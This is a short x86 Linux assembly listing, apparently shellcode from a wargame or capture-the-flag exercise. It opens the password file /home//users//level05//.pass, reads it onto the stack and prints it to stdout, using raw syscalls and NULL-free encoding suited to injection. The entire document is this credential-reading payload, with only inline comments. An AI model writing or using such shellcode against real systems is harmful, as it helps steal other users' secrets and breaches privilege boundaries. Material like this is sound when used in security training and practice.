xor     eax, eax        ;Clearing eax register
push    eax             ;Pushing NULL bytes

push    0x73736170      ;Pushing pass
push    0x2e2f2f35      ;Pushing 5//.
push    0x306c6576      ;Pushing vel0
push    0x656c2f2f      ;Pushing //le
push    0x73726573      ;Pushing sers
push    0x752f2f65      ;Pushing e//u
push    0x6d6f682f      ;Pushing /hom
mov     ebx, esp        ;ebx now has address of /home//users//level05//.pass
push    eax             ;Pushing NULL byte
xor     ecx, ecx        ;ecx now has flag O_RDONLY (0x0000)
mov     al, 5           ;syscall number of open is 5
int     0x80            ;Make the system call

mov     ebx, eax        ; File descriptor
mov     al, 3           ; sys_read system call number
lea     ecx, [esp+41]   ; Buffer to read into (stack)
mov     dl, 41          ; Number of bytes to read
int     0x80            ; Call kernel

mov     al, 4           ; sys_write system call number
mov     bl, 1           ; File descriptor 1 (stdout)
int     0x80            ; Call kernel

mov     al, 1           ; syscall exit
xor     ebx, ebx        ; set exit value to zero
int     0x80            ; call kernel